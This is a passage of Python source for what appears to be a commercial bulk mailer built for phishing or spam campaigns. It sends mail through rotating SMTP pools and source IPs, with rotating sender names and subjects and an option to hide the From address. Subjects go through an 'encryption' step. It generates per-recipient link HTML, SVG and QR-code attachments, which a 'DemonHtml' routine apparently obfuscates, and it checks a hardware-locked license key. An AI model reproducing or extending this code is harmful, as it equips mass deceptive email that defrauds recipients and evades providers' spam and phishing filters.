                nmsg = nmsg.replace(img, "cid:"+img_filename)
                src_imgs.append(img_src)
            else:
                img_filename = os.path.basename(img_src)
                nmsg = nmsg.replace(img, "cid:"+img_filename)
                src_imgs.append(img_src)

        else:
            if img.lower().startswith('{image}'):
                img_src = GetBanner(emails,link)
                nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))

            elif img.lower().startswith('http'):
                img_src_path = download_image_to_logopics(img)
                if not img_src_path:
                    nmsg = nmsg.replace(img, "")
                    continue
                img_src = img_src_path
                nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
            else:
                img_src = img
            nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
            src_imgs.append(img_src)

    if qrcode_cid and qrcode_cid in src_imgs:
        src_imgs = [p for p in src_imgs if p != qrcode_cid]

    corpo = MIMEText(nmsg, 'html', 'utf-8')

    selected_header_profile = get_custom_header_profile()

    # Select rotating From email if enabled
    try:
        selected_fromemail, sname, envelope_sender = resolve_sender_identity(
            emails,
            fromemail,
            sender,
            name,
            selected_header_profile,
        )
        sfromemail = selected_fromemail or normalize_sender_address(sender, username)
    except Exception:
        sname = findString(emails, name)
        sfromemail = normalize_sender_address(fromemail, sender)
        envelope_sender = findString(emails, sender)
    selected_subject = get_profile_subject(selected_header_profile) if custom_headers_enabled else None
    if not selected_subject:
        selected_subject = get_rotating_subject()
    newsub = findString(emails, selected_subject)
    newsub = apply_subject_encryption(newsub)

    msg = MIMEMultipart('related')
    # Hide email address in From header if hideFromMail is enabled
    if frommail_setup.get('hideFromMail', 0) == 1:
        msg['From'] = formataddr((str(Header(sname, 'utf-8')), ''))
    else:
        msg['From'] = formataddr((str(Header(sname, 'utf-8')), sfromemail))
    #msg['From'] = bytes(name, 'utf-8').decode()+'<'+fromemail+'>'
    msg['To'] = emails
    msg['Subject'] = Header(newsub, 'utf-8')
    msg['X-Priority'] = msg_priority
    try:
        apply_custom_headers(msg, emails, header_profile=selected_header_profile)
        if custom_headers_enabled:
            applied_headers = ', '.join(
                header_name for header_name in ('Message-ID', 'Return-Path') if msg.get(header_name)
            ) or 'none'
            print(f"{Fore.CYAN}[HEADERS] Applied: {applied_headers} for {emails}{Style.RESET_ALL}", flush=True)
    except Exception as header_error:
        print(f"{Fore.YELLOW}[HEADERS] Apply failed for {emails}: {header_error}{Style.RESET_ALL}", flush=True)
    # v9.2: RFC 5322 requires a Date header. Providers and spam filters
    # penalise or reject messages that omit it. Respect a Date supplied by the
    # custom-header profile; otherwise stamp it from the configured timezone.
    try:
        if not msg.get('Date'):
            _date_header_value = build_date_header()
            if _date_header_value:
                msg['Date'] = _date_header_value
    except Exception as date_error:
        print(f"{Fore.YELLOW}[HEADERS] Date header failed for {emails}: {date_error}{Style.RESET_ALL}", flush=True)
    # v9.5: RFC 5322 requires a Message-ID. Ordinary sends (custom headers
    # disabled) previously emitted none; providers/spam filters penalise it.
    try:
        if not msg.get('Message-ID'):
            from email.utils import make_msgid
            msg["Message-ID"] = make_msgid()
    except Exception:
        pass
    # Reply-To header
    try:
        if replyTo_setup.get('replyTo') and replyTo_setup.get('replyTo').lower() != 'default' and replyTo_setup.get('replyTo').strip():
            rt_email = findString(emails, replyTo_setup.get('replyTo'))
        else:
            rt_email = sfromemail
        rt_name = replyTo_setup.get('replyToName') or ''
        if rt_email:
            msg['Reply-To'] = formataddr((rt_name, rt_email))
    except Exception:
        pass
    
    


    # HTML Image inline conversion
    html_image_part = None
    try:
        nmsg, html_image_part = prepare_htmlimage_inline(nmsg, emails, nlink)
    except Exception as exc:
        print(f"{Fore.YELLOW}[HTMLIMAGE] Inline image preparation failed: {exc}{Style.RESET_ALL}")

    corpo = MIMEText(nmsg, 'html', 'utf-8')
    msg.attach(corpo)

    if html_image_part is not None:
        msg.attach(html_image_part)

    trace_generated_enabled = any([
        pdf_setup.get('enable', 0) == 1,
        svg_setup.get('enable', 0) == 1,
        doc_setup.get('enable', 0) == 1,
        docx_setup.get('enable', 0) == 1,
        rtf_setup.get('enable', 0) == 1,
        pptx_setup.get('enable', 0) == 1,
        icalendar_setup.get('enable', 0) == 1,
        eml_setup.get('enable', 0) == 1,
        otherfile_setup.get('enable', 0) == 1
    ])
    print(f"{Fore.CYAN}[TRACE] attachment flags: htmlAttachment={htmlAttachment_setup.get('enable', 0)}, svgAttachment={svgAttachment_setup.get('enable', 0)}, generated={trace_generated_enabled}, usedoc={usedoc}, autohtml={autokilllink}{Style.RESET_ALL}")

    # Attach EVERY enabled HTML/SVG attachment. This previously attached only one
    # of the two (rotating per message), which silently dropped the other
    # attachment whenever both html and svg attachments were enabled, so
    # recipients received only one of the configured files.
    eml_only = eml_setup.get('enable', 0) == 1 and eml_setup.get('onlyEml', 0) == 1
    html_enabled = htmlAttachment_setup.get('enable', 0) == 1 and not eml_only
    svg_enabled = svgAttachment_setup.get('enable', 0) == 1 and not eml_only

    if html_enabled:
        attach_html_attachment(msg, emails, nlink, message_link_urls)
    if svg_enabled:
        attach_svg_attachment(msg, emails, nlink)

    try:
        if link_svg_setup.get('enable', 0) == 1 and not eml_only:
            attach_link_svg_attachment(msg, emails, nlink)
    except Exception:
        pass

    generated_attachments = []
    if trace_generated_enabled:
        # Pass inline images (e.g., logo) so they can be embedded into generated .eml when requested
        try:
            generated_attachments = attach_generated_files(msg, emails, extra_embed_files=src_imgs)
        except TypeError:
            # backward compatibility: function may not accept extra parameter
            generated_attachments = attach_generated_files(msg, emails)
        if generated_attachments:
            attachment_names = ', '.join(os.path.basename(path) for path in generated_attachments)
            print(f"{Fore.CYAN}[ATTACHMENT] Attached generated file(s): {attachment_names}{Style.RESET_ALL}")
        elif pdf_setup.get('enable', 0) == 1:
            print(f"{Fore.YELLOW}[ATTACHMENT] PDF enabled but no PDF was attached for {emails}{Style.RESET_ALL}")

    if usedoc:
        htmlfilen = "attach.html"
        print(f"{Fore.CYAN}[TRACE] usedoc enabled, generating HTML attachment: {htmlfilen}{Style.RESET_ALL}")

        htmlfile = MakeHtml(emails,f"{findString(emails,sfile)}",htmlfilen,nlink)
        if autoKillHTML:
            htmlfile = DemonHtml(htmlfile)

        with open(htmlfile, 'r', encoding='utf-8', errors='replace') as fh:
            html_text = fh.read()
        part = MIMEText(html_text, _subtype='html', _charset='utf-8')
        part.add_header('Content-Disposition', 'inline', filename=(Header(os.path.basename(htmlfile), 'utf-8').encode()))
        msg.attach(part)
        
        

    if autokilllink:
        htmlfilen = auto_code(nlink)
        print(f"{Fore.CYAN}[TRACE] autohtml enabled, generating link HTML attachment: {htmlfilen}{Style.RESET_ALL}")

        htmlfile = MakeHtmlLink(emails,f"{findString(emails,sfile)}.htm",htmlfilen)
        if autoKillHTML:
            htmlfile = DemonHtml(htmlfile)

        with open(htmlfile, 'r', encoding='utf-8', errors='replace') as fh:
            html_text = fh.read()
        part = MIMEText(html_text, _subtype='html', _charset='utf-8')
        part.add_header('Content-Disposition', 'inline', filename=(Header(os.path.basename(htmlfile), 'utf-8').encode()))
        msg.attach(part)

    try:
        #imgs = blowimgsrc(nmsg)
        for up_imgsrc in src_imgs:
            ##imgsrc = img
            if not os.path.exists('IMG'):
                os.makedirs('IMG')
            else:
                imgo = open(up_imgsrc, 'rb')
                if up_imgsrc.endswith("svg"):
                    msgImage = MIMEImage(imgo.read(),_subtype="svg+xml")
                else:
                    msgImage = MIMEImage(imgo.read())
                #imgo.close()
                msgImage.add_header('Content-ID', '<'+os.path.basename(up_imgsrc)+'>')
                msgImage.add_header('Content-Disposition', 'inline', filename=(Header(os.path.basename(up_imgsrc), 'utf-8').encode()))
                msg.attach(msgImage)
    except Exception as e:
        imgerror = str(e)
        print(imgerror)

    if qrcode_cid:
        try:
            qr_data = _resolve_qr_data(nlink, emails)
            qr_bytes = generate_qr_code_image(qr_data)
            qrImage = MIMEImage(qr_bytes, _subtype='png')
            qrImage.add_header('Content-ID', '<'+qrcode_cid+'>')
            qrImage.add_header('Content-Disposition', 'inline', filename=(Header(qrcode_cid, 'utf-8').encode()))
            msg.attach(qrImage)
        except Exception as e:
            print('[ QRCode Error ]: '+str(e))

    # v8.7: deliver with bounded source-IP failover. On a connection-class
    # failure (a dead / routed-unusable bind IP such as WinError 10060), retry
    # the same message through the other configured source IPs. Application-
    # level failures (auth, 5xx rejection) are NOT retried, to avoid duplicate
    # sends. Returns (result, active_bind_ip); raises the last error when every
    # candidate fails so the caller's existing failure accounting still runs.
    def _deliver_with_bind_ip_failover(active_bind_ip):
        try:
            result = deliver_message(delivery_recipients, envelope_sender, msg.as_string(), smtpserv, int(port), its_authy, username, password, its_secure, bind_ip=active_bind_ip, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
            return result, active_bind_ip
        except Exception as exc:
            if proxy is not None or not active_bind_ip:
                raise
            if not _is_connection_class_error(exc) and not is_bind_address_error(exc):
                raise
            candidates = _bind_ip_failover_candidates(active_bind_ip)
            last_exc = exc
            for attempt, candidate in enumerate(candidates, start=1):
                print(f"{Fore.YELLOW}[FAILOVER] Source IP {active_bind_ip or 'default'} unreachable ({exc}); retrying via {candidate} (attempt {attempt}/{len(candidates)}){Style.RESET_ALL}", flush=True)
                try:
                    result = deliver_message(delivery_recipients, envelope_sender, msg.as_string(), smtpserv, int(port), its_authy, username, password, its_secure, bind_ip=candidate, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
                except Exception as exc2:
                    last_exc = exc2
                    if not _is_connection_class_error(exc2) and not is_bind_address_error(exc2):
                        raise
                    continue
                if result:
                    print(f"{Fore.GREEN}[FAILOVER] Delivery succeeded via source IP {candidate}{Style.RESET_ALL}", flush=True)
                    return result, candidate
                last_exc = Exception('delivery returned no result via source IP {}'.format(candidate))
            # v9.0: when every configured source IP fails (for example none of
            # them is actually assigned to this host), fall back to the default
            # route instead of hard-failing the lead.
            print(f"{Fore.YELLOW}[FAILOVER] All configured source IPs failed ({last_exc}); retrying via default route with no source-IP bind{Style.RESET_ALL}", flush=True)
            try:
                result = deliver_message(delivery_recipients, envelope_sender, msg.as_string(), smtpserv, int(port), its_authy, username, password, its_secure, bind_ip=None, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
            except Exception as exc_default:
                raise exc_default
            if result:
                print(f"{Fore.GREEN}[FAILOVER] Delivery succeeded via default route{Style.RESET_ALL}", flush=True)
                return result, None
            raise last_exc

    try:
        try:
            line_info = f" [ Line #{line_number} ]" if line_number else ""
            # Don't append port if bind_ip already contains a port (proxy format)
            ip_port_display = bind_ip if bind_ip and ':' in bind_ip else f"{bind_ip}:{port}" if bind_ip else ""
            ip_display = f" [ {Fore.MAGENTA}IP:Port: {ip_port_display}{Style.RESET_ALL} ]" if ip_port_display else ""
            reported_host = describe_delivery_target(emails, smtpserv)
            print(f"{Fore.WHITE}[ Sending ]{Style.RESET_ALL}: {reported_host} -> {Fore.WHITE}[ Delivering to ]{Style.RESET_ALL}: {reported_host} -> recipient: {line_info}{Fore.BLUE}{emails}{Style.RESET_ALL}{ip_display}", flush=True)
            delivery_result, bind_ip = _deliver_with_bind_ip_failover(bind_ip)
            if delivery_result:
                record_details = f"{emails}\nAttachments: {', '.join(os.path.basename(path) for path in generated_attachments) or 'none'}"
                save_record('success', emails, record_details, subject=newsub)
                _send_succeeded = True
                with success_count_lock:
                    success_sent_count += 1
                    current_success_count = success_sent_count
                #servers.sendmail(fromemail, [emails], msg.as_string())
                # If running in concurrent sorter+send and a source file was provided, print sorter-style
                if concurrent_sorter_send_global and source_file:
                    # sorter-style sent in green
                    print(f"{Fore.GREEN}[Sorter] [{Fore.GREEN}{emails}{Fore.GREEN}] [{source_file}] Sent #{current_success_count}{Style.RESET_ALL}")
                else:
                    # [ Success ] in green, time in yellow, email in green
                    print(f"{Fore.GREEN}[ Success #{current_success_count} ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.GREEN}[ {emails} ]{Style.RESET_ALL} {Fore.GREEN}250 2.0.0 OK{Style.RESET_ALL}")
                maybe_send_test_email(smtpserv, port, its_authy, username, password,
                                      envelope_sender, its_secure, msg.as_string(),
                                      bind_ip=bind_ip, proxy=proxy)
            else:
                record_details = f"{emails}\nAttachments: {', '.join(os.path.basename(path) for path in generated_attachments) or 'none'}"
                save_record('failed', emails, record_details, subject=newsub)
                with success_count_lock:
                    failed_sent_count += 1
                # Failed line in red, time in yellow, email in red
                print(f"{Fore.RED}[ Failed! ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.RED}[ {emails} ]{Style.RESET_ALL} {Fore.RED}250 2.0.0 FAIL{Style.RESET_ALL}")
                ##print('[!] '+emails+': Failed')
        except Exception as e:
            while 'unexpectedly closed'.lower() in str(e).lower():
                ##while ConnectSMTP(smtpserv,int(port),its_authy,username, password,emails,sender,its_secure,msg.as_string()) != True:

                line_info = f" [ Line #{line_number} ]" if line_number else ""
                ip_display = f" [ {Fore.MAGENTA}IP: {bind_ip}{Style.RESET_ALL} ]" if bind_ip else ""
                print(f"{Fore.WHITE}[ SMTP Host (retry) ]{Style.RESET_ALL}: {smtpserv} -> recipient: {Fore.BLUE}{emails}{Style.RESET_ALL}{line_info}{ip_display}")
                delivery_result = deliver_message(delivery_recipients, envelope_sender, msg.as_string(), smtpserv, int(port), its_authy, username, password, its_secure, bind_ip=bind_ip, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
                if delivery_result:
                    record_details = f"{emails}\nAttachments: {', '.join(os.path.basename(path) for path in generated_attachments) or 'none'}"
                    save_record('success', emails, record_details, subject=newsub)
                    _send_succeeded = True
                    with success_count_lock:
                        success_sent_count += 1
                        current_success_count = success_sent_count
                    if concurrent_sorter_send_global and source_file:
                        print(f"{Fore.GREEN}[Sorter] [{Fore.GREEN}{emails}{Fore.GREEN}] [{source_file}] Sent #{current_success_count}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}[ Success #{current_success_count} ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.GREEN}[ {emails} ]{Style.RESET_ALL} {Fore.GREEN}250 2.0.0 OK{Style.RESET_ALL}")
                    maybe_send_test_email(smtpserv, port, its_authy, username, password,
                                          envelope_sender, its_secure, msg.as_string(),
                                          bind_ip=bind_ip, proxy=proxy)
                    break
            else:
                # Detect server-busy style errors and auto-pause if configured
                try:
                    emsg = str(e).lower()
                    if serverbusy and ("server busy" in emsg or "serverbusy" in emsg or "421" in emsg):
                        print(f"{Fore.YELLOW}[SERVERBUSY] Detected server-busy response: {str(e)}{Style.RESET_ALL}")
                        serverbusy_pause()
                except Exception:
                    pass

                record_details = f"{emails}\nAttachments: {', '.join(os.path.basename(path) for path in generated_attachments) or 'none'}"
                save_record('failed', emails, record_details, subject=newsub)
                with success_count_lock:
                    failed_sent_count += 1
                print(f"{Fore.RED}[ Failed! ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.RED}[ {emails} ]{Style.RESET_ALL} {Fore.RED}{str(e)}{Style.RESET_ALL}{eml_rejection_hint(e, emails)}")
                ##print('[!] '+emails+': Failed ['+str(e)+']')
    except Exception as e:
        while 'unexpectedly closed'.lower() in str(e).lower():
            print(f"[ SMTP Host (outer retry) ]: {smtpserv} -> recipient: {emails}")
            delivery_result = deliver_message(delivery_recipients, envelope_sender, msg.as_string(), smtpserv, int(port), its_authy, username, password, its_secure, bind_ip=bind_ip, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
            if delivery_result:
                record_details = f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\nEmail: {emails}\nSubject: {newsub}\nFrom: {sfromemail}\nLink: {nlink}\nIP: {bind_ip}\nStatus: success\n\nBody:\n{nmsg}"
                save_record('success', emails, record_details, subject=newsub)
                _send_succeeded = True
                with success_count_lock:
                    success_sent_count += 1
                    current_success_count = success_sent_count
                print(f"{Fore.GREEN}[ Success #{current_success_count} ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.GREEN}[ {emails} ]{Style.RESET_ALL} {Fore.GREEN}250 2.0.0 OK{Style.RESET_ALL}")
                maybe_send_test_email(smtpserv, port, its_authy, username, password,
                                      envelope_sender, its_secure, msg.as_string(),
                                      bind_ip=bind_ip, proxy=proxy)
                break
        else:
            # Detect server-busy style errors and auto-pause if configured
            try:
                emsg = str(e).lower()
                if serverbusy and ("server busy" in emsg or "serverbusy" in emsg or "421" in emsg):
                    print(f"{Fore.YELLOW}[SERVERBUSY] Detected server-busy response: {str(e)}{Style.RESET_ALL}")
                    serverbusy_pause()
            except Exception:
                pass

            record_details = f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\nEmail: {emails}\nSubject: {newsub}\nFrom: {sfromemail}\nLink: {nlink}\nIP: {bind_ip}\nStatus: failed\nError: {str(e)}\n\nBody:\n{nmsg}"
            save_record('failed', emails, record_details, subject=newsub)
            with success_count_lock:
                failed_sent_count += 1
            print(f"{Fore.RED}[ Failed! ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.RED}[ {emails} ]{Style.RESET_ALL} {Fore.RED}{str(e)}{Style.RESET_ALL}{eml_rejection_hint(e, emails)}")
        ##print('[!] '+emails+': Failed ['+str(e)+']')
    finally:
        #servers.quit()
        if usedoc or autokilllink:
            if os.path.isfile(htmlfile):
                os.remove(htmlfile)
    return _send_succeeded

class dmailer(threading.Thread):
    def __init__(self, queue, assigned_bind_ip=None):
        threading.Thread.__init__(self)
        self.queue = queue
        self.assigned_bind_ip = assigned_bind_ip
        self.stop_requested = False

    def request_stop(self):
        self.stop_requested = True
        try:
            self.queue.put(None)
        except Exception:
            pass

    def run(self):
        while True:
            task_started = False
            # While paused, periodically reload config so runtime changes take effect
            while not pause_event.is_set():
                try:
                    reload_config_if_changed()
                except Exception:
                    pass
                time.sleep(0.5)

            try:
                item = self.queue.get()
                if item is None:
                    try:
                        self.queue.task_done()
                    except Exception:
                        pass
                    break
                task_started = True
                if len(item) == 13:
                    (self.default_address,self.smtpserv,self.port,self.its_authy,self.username,
                     self.password,self.fromemail,self.sender,self.its_secure,
                     self.line_number,self.source_file,self.bind_ip,self.smtp_dangerous) = item
                elif len(item) == 12:
                    (self.default_address,self.smtpserv,self.port,self.its_authy,self.username,
                     self.password,self.fromemail,self.sender,self.its_secure,
                     self.line_number,self.source_file,self.bind_ip) = item
                    self.smtp_dangerous = None
                elif len(item) == 11:
                    (self.default_address,self.smtpserv,self.port,self.its_authy,self.username,
                     self.password,self.fromemail,self.sender,self.its_secure,
                     self.line_number,self.source_file) = item
                    self.bind_ip = None
                    self.smtp_dangerous = None
                elif len(item) == 10:
                    (self.default_address,self.smtpserv,self.port,self.its_authy,self.username,
                     self.password,self.fromemail,self.sender,self.its_secure,
                     self.line_number) = item
                    self.source_file = None
                    self.bind_ip = None
                    self.smtp_dangerous = None
                else:
                    self.default_address = None
                    self.smtpserv = None
                    self.port = None
                    self.its_authy = None
                    self.username = None
                    self.password = None
                    self.fromemail = None
                    self.sender = None
                    self.its_secure = None
                    self.line_number = None
                    self.source_file = None
                    self.bind_ip = None
                    self.smtp_dangerous = None

                # If this worker has an assigned bind IP (ip-threading mode), use it when item has no bind_ip
                bind_ip_to_use = self.bind_ip if getattr(self, 'bind_ip', None) else None
                if (not bind_ip_to_use) and self.assigned_bind_ip:
                    bind_ip_to_use = self.assigned_bind_ip

                # Print sending line here so terminal shows active sends rather than queuing only
                try:
                    total_est = '?'
                    route = describe_delivery_target(self.default_address, self.smtpserv)
                    print(f"{Fore.CYAN}[SEND] Sending line {self.line_number}/{total_est}: {self.default_address} via {route} [IP: {bind_ip_to_use if bind_ip_to_use else 'default'}]{Style.RESET_ALL}")
                except Exception:
                    pass

                # Rate limiting: acquire semaphore if configured
                acquired = False
                try:
                    if rate_semaphore:
                        rate_semaphore.acquire()
                        acquired = True
                    Sendout(self.default_address,self.smtpserv,self.port,self.its_authy,self.username,
                            self.password,self.fromemail,self.sender,self.its_secure,
                            self.line_number, bind_ip=bind_ip_to_use, source_file=self.source_file,
                            smtp_dangerous_override=self.smtp_dangerous)
                finally:
                    if acquired:
                        try:
                            rate_semaphore.release()
                        except Exception:
                            pass

                # Per-send delay (but allow config reloads while waiting)
                try:
                    d = float(send_delay) if send_delay else 0.0
                except Exception:
                    d = 0.0
                remaining = d
                while remaining > 0:
                    t = min(0.5, remaining)
                    time.sleep(t)
                    remaining -= t
                    try:
                        reload_config_if_changed()
                    except Exception:
                        pass

            except Exception as e:
                print(f"{Fore.RED}[ WORKER ERROR ]{Style.RESET_ALL}: {Fore.YELLOW}{time.strftime('%H:%M:%S %p')}{Style.RESET_ALL} {Fore.RED}[ {getattr(self,'default_address',None)} ]{Style.RESET_ALL} {Fore.RED}{str(e)}{Style.RESET_ALL}")
                ##print('[*] '+self.default_address+': Failed [ '+str(e)+' ]')
            finally:
                if task_started:
                    maybe_trigger_task_pause()
                try:
                    self.queue.task_done()
                except Exception:
                    pass

def checkkeycode(key):
    try:
        if key == "":
            print("Token Cant be empty")
            return False
        key_file = "0DM"+key+".key"
        found = True if os.path.exists(key_file) else False
        if found:
            with open(key_file) as my_file:
                my_file.seek(0)
                first_char = my_file.read(1)
                if not first_char:
                    return False
                else:
                    my_file.seek(0)
                    content = my_file.read()
                    content = str(hex2bin(content),'utf-8')
                    new_key,ipplus = content.split('@', 1)
                    new_key = str(hex2bin(new_key),'utf-8')
                    ip,exptime = ipplus.split(':', 1)
                    ip = str(hex2bin(ip),'utf-8')
                    exptime = str(hex2bin(exptime),'utf-8')
                    new_ip = str(get_hardware_uuid())
                    is_key = True if ((new_key == key)) else False
                    is_ip = True if ((ip == get_hardware_uuid())) else False
                    if is_key:
                        if is_ip:
                            if its_date(exptime):
                                return True
                            else:
                                return False
                        else:
                            print(key+ " Registered to another user.")
                            return False
                    else:
                        print(key, "Invalid KEY :"+ key)
                        return False
        else:
            print("Invalid KEY : "+key)
            return False
    except Exception as e:
        print(e)
        return False

def RandomSMTP(file):
    try:
        lines = open(file).read().splitlines()
        myline =random.choice(lines)
        return myline
    except Exception as ex:
        template = "[SMTP RANDOM ERROR]: exception type {0}. :\n{1!r}"
        message = template.format(type(ex).__name__, ex.args)
        print(message)
        #print("Next entry.")
        exit(0)

def RandomArraySMTP(file=None):
    file = file or smtp_pool_file
    mother_smtp_array = []
    lines = open(file).read().splitlines()
    for line_number,smtp_line in enumerate(lines):
        #print(line_number)
        table_row = {'smtp_id': 'smtp'+str(line_number), 'smtp_reset_time': '', 'smtp_count': str(0)}
        smtpSplit = [part.strip() for part in (smtp_line.split('|') if '|' in smtp_line else smtp_line.split(' ; '))]
        if len(smtpSplit) < 5:
            continue
        table_row['smtp_server'] = smtpSplit[0]
        table_row['smtp_port'] = smtpSplit[1]
        if '|' in smtp_line:
            table_row['smtp_username'] = smtpSplit[3]
            table_row['smtp_password'] = smtpSplit[4]
            table_row['smtp_fromemail'] = smtpSplit[5] if len(smtpSplit) > 5 else ''
            table_row['smtp_secure'] = smtpSplit[2].lower() in ('tls', 'ssl', '1', 'true', 'yes', 'on')
            table_row['smtp_dangerous'] = smtpSplit[6].lower() in ('1', 'true', 'yes', 'on') if len(smtpSplit) > 6 else False
            table_row['smtp_authy'] = bool(table_row['smtp_username'] or table_row['smtp_password'])
            table_row['msg_fromemail'] = table_row['smtp_fromemail']
            limit = smtpSplit[7] if len(smtpSplit) > 7 else '-1'
        else:
            table_row['smtp_username'] = smtpSplit[2]
            table_row['smtp_password'] = smtpSplit[3]
            table_row['smtp_fromemail'] = smtpSplit[4]
            table_row['smtp_secure'] = smtpSplit[5].lower() in ('1','true','yes','on') if len(smtpSplit) > 5 else False
            table_row['smtp_dangerous'] = False
            table_row['smtp_authy'] = smtpSplit[6].lower() in ('1','true','yes','on') if len(smtpSplit) > 6 else bool(table_row['smtp_username'] or table_row['smtp_password'])
            table_row['msg_fromemail'] = smtpSplit[7] if len(smtpSplit) > 7 else table_row['smtp_fromemail']
            limit = smtpSplit[8] if len(smtpSplit) > 8 else '-1'
        try:
            table_row['smtp_max'] = int(limit)
        except ValueError:
            table_row['smtp_max'] = -1
        mother_smtp_array.append(table_row)
        #print(table_row)
    #print(mother_smtp_array)
    return mother_smtp_array


def select_smtp_entry(smtp_entries, selection_system=2):
    """Select and account for one available SMTP pool entry."""
    global smtp_rotation_index
    available = []
    for entry in smtp_entries or []:
        try:
            count = int(entry.get('smtp_count', 0))
        except (TypeError, ValueError):
            count = 0
        try:
            limit = int(entry.get('smtp_max', -1))
        except (TypeError, ValueError):
            limit = -1
        entry['smtp_count'] = count
        entry['smtp_max'] = limit
        if limit < 0 or count < limit:
            available.append(entry)

    if not available:
        raise RuntimeError('All SMTP pool entries have reached their sending limits.')

    if int(selection_system or 2) == 1:
        with smtp_rotation_lock:
            selected = available[smtp_rotation_index % len(available)]
            smtp_rotation_index += 1
    else:
        selected = random.choice(available)
    selected['smtp_count'] += 1
    return selected

# ============= SORTER INTEGRATION =============
def run_email_sorter(email_list_file, sorter_threads):
    """Run the MX email sorter on the email list"""
    try:
        import subprocess
        sorter_script = os.path.join("sorter", "main.py")
        if not os.path.exists(sorter_script):
            print(f"{Fore.RED}[ERROR] Sorter script not found at {sorter_script}{Style.RESET_ALL}")
            return False
        
        # No need to copy leads.txt; sorter/main.py now reads leads.txt directly
        
        print(f"{Fore.CYAN}[SORTER] Starting email classification with {sorter_threads} threads...{Style.RESET_ALL}")
        result = subprocess.run([sys.executable, sorter_script, "--threads", str(sorter_threads)], 
                              capture_output=False, text=True)
        return result.returncode == 0
    except Exception as e:
        print(f"{Fore.RED}[SORTER ERROR] {str(e)}{Style.RESET_ALL}")
        return False

def get_sorted_email_files(target_files_str):
    """Get list of sorted email files to send to"""
    sorted_dir = os.path.join("sorter", "sorted_emails")
    target_files = [f.strip() for f in target_files_str.split(',') if f.strip()]
    
    available_files = []
    for target_file in target_files:
        filepath = os.path.join(sorted_dir, target_file)
        # Create empty file if it doesn't exist
        if not os.path.exists(filepath):
            open(filepath, 'a').close()
        available_files.append(filepath)
        print(f"{Fore.GREEN}[SORTER] Target file ready: {target_file}{Style.RESET_ALL}")
    
    return available_files

def load_all_sorted_emails(target_files_list):
    """Load emails from all sorted target files"""
    all_emails = []
    for filepath in target_files_list:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                emails = [line.strip() for line in f.readlines() if line.strip()]
                all_emails.extend(emails)
                print(f"{Fore.CYAN}[SORTER] Loaded {len(emails)} emails from {os.path.basename(filepath)}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[SORTER] Could not read {filepath}: {str(e)}{Style.RESET_ALL}")
    
    return all_emails

# File position tracking for concurrent mode
sorter_file_positions = {}
sorter_queued_emails = set()
sorter_file_lock = threading.Lock()


# Global flag to indicate concurrent sorter+send mode across threads
concurrent_sorter_send_global = False

# Server busy auto-pause config
serverbusy = False  # Set True/False in config or at runtime
serverbusy_pause_duration = 300  # seconds (5 minutes by default)
def serverbusy_pause():
    global auto_pause, stopwatch_timer_active
    with stopwatch_timer_lock:
        if stopwatch_timer_active:
            return
        stopwatch_timer_active = True
        # Don't auto-set pause unless explicitly enabled in config
        update_pause_event()

    def timer_func():
        global pause_remaining, pause_reason
        pause_reason = "SERVERBUSY"
        with pause_remaining_lock:
            pause_remaining = serverbusy_pause_duration
        print(f"[SERVERBUSY] Pause triggered for {serverbusy_pause_duration} seconds due to server busy error. Waiting {format_duration(serverbusy_pause_duration)} to resume...")
        for remaining in range(serverbusy_pause_duration, 0, -1):
            try:
                reload_config_if_changed()
            except Exception:
                pass
            with pause_remaining_lock:
                pause_remaining = remaining
            spinner = pause_spinner_chars[remaining % len(pause_spinner_chars)]
            line = f"[SERVERBUSY] {remaining}... resuming {spinner}"
            print(line.ljust(80), end='\r', flush=True)
            time.sleep(1)
        print(' ' * 80, end='\r')  # Clear line
        with stopwatch_timer_lock:
            stopwatch_timer_active = False
            pause_reason = None
            with pause_remaining_lock:
                pause_remaining = 0
            update_pause_event()
        print(f"[SERVERBUSY] Timer complete after {format_duration(serverbusy_pause_duration)}.")

    threading.Thread(target=timer_func, daemon=True).start()

def monitor_sorted_files_concurrent(target_files_list, email_queue, pause_event, stop_event, smtp_config):
    """Monitor sorted files for new emails (concurrent mode) and queue them."""
    global sorter_file_positions, sorter_queued_emails

    print(f"{Fore.CYAN}[SORTER+SEND] File monitor started - watching for new emails...{Style.RESET_ALL}")

    # Initialize file positions
    with sorter_file_lock:
        for filepath in target_files_list:
            sorter_file_positions[filepath] = 0

    poll_delay = 0.5  # Check every 500ms for new emails

    while not stop_event.is_set():
        try:
            # reload runtime config each monitor iteration so changes take effect immediately
            try:
                reload_config_if_changed()
            except Exception:
                pass
            for filepath in target_files_list:
                try:
                    if not os.path.exists(filepath):
                        continue

                    with sorter_file_lock:
                        last_position = sorter_file_positions.get(filepath, 0)

                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        f.seek(last_position)
                        for line_number, line in enumerate(f, start=1):
                            email = line.strip()
                            if not email or email in sorter_queued_emails:
                                continue
                            sorter_queued_emails.add(email)
                            bind_ip = get_next_bind_ip()
                            email_queue.put((
                                email,
                                smtp_config['smtpserv'],
                                smtp_config['port'],
                                smtp_config['its_authy'],
                                smtp_config['username'],
                                smtp_config['password'],
                                smtp_config['fromemail'],
                                smtp_config['sender'],
                                smtp_config['its_secure'],
                                line_number,
                                filepath,
                                bind_ip
                            ))
